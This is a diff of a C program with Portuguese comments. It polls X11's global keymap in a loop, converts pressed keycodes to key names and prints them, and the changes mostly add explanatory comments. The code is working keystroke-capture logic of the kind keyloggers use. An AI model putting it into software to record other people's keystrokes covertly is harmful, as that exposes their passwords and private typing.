@@ -9,24 +9,6 @@
 #include <signal.h>
 #include <X11/keysym.h>
 
-
- #include <termios.h>
-#include <unistd.h>
-#include <stdio.h>
-/* reads from keypress, doesn't echo */
-int getch(void)
-{
-struct termios oldattr, newattr;
-int ch;
-tcgetattr( STDIN_FILENO, &oldattr );
-newattr = oldattr;
-newattr.c_lflag &= ~( ICANON | ECHO );
-tcsetattr( STDIN_FILENO, TCSANOW, &newattr );
-ch = getchar();
-tcsetattr( STDIN_FILENO, TCSANOW, &oldattr );
-return ch;
-}
-
 Display *display;
 
 int die;
@@ -85,15 +67,19 @@ int main(int argc, char* argv) {
     fflush(stdout);
 
     // Ao contrario do sleep(segundos) o usleep trabalha com microsegundos.
+    // nao deixar cpu chegar a 100% de load
     usleep(5000);
 
     // pega todas as keys que são pressionadas
     XQueryKeymap(display, nk);
 
-    for(i=0;i<32;i++) { // quantidade de bits passado pela XQueryKeymap. Sempre 32bits
-
-      // printf("#%d    %c %c \n",i , nk[i],ok[i]);
-      if(nk[i] != ok[i]) { // verifica se ja nao foi pressionada
+    /*
+     * quantidade de bits passado pela XQueryKeymap. Sempre 32bits
+     * passa por todos os membros do keymap
+     */
+    for(i=0;i<32;i++) {
+      /* remove repeticao */
+      if(nk[i] != ok[i]) {
         /*
          * Basicamente ele entra aqui quando detecta que uma teclas foi realmente pressionada
          * ou seja, aqui ele elimina a repetição do processo causada pelo while infinito
@@ -102,10 +88,24 @@ int main(int argc, char* argv) {
         // printf("#%d %c %c \n",i , nk[i],ok[i]);
         if(nk[i] != 0) {
           // printf("#%d %c \n",i , nk[i]);
-          //pressed key
-          keycode=i*8+fooling(nk[i] ^ ok[i]);
+          // printf("code: %f\n", nk[i] ^ ok[i]);
+          // printf("%d - ", nk[i] ^ ok[i]);
+          // printf("%c - ", nk[i] ^ ok[i]);
+          // printf("%c - ", fooling(nk[i] ^ ok[i]));
+          // printf("%c \n", i*8+fooling(nk[i] ^ ok[i]));
+
+          /* nao consegui entender ainda, mas nao funciona sem essa funcao e multiplicacao */
+          // keycode = int
+          keycode= i * 8 + fooling(nk[i] ^ ok[i]);
+
+          // retorna o simbolo da key pressionada
+          // ks = KeySym
           char ks = XKeycodeToKeysym(display, keycode, 0);
+
+          // transforma a key em string.
+          // precisa ser parametro KeySym
           char *keyname = XKeysymToString(ks);
+
           if(!keyname) {
             keyname="";
             if(keycode==50 || keycode==62) {
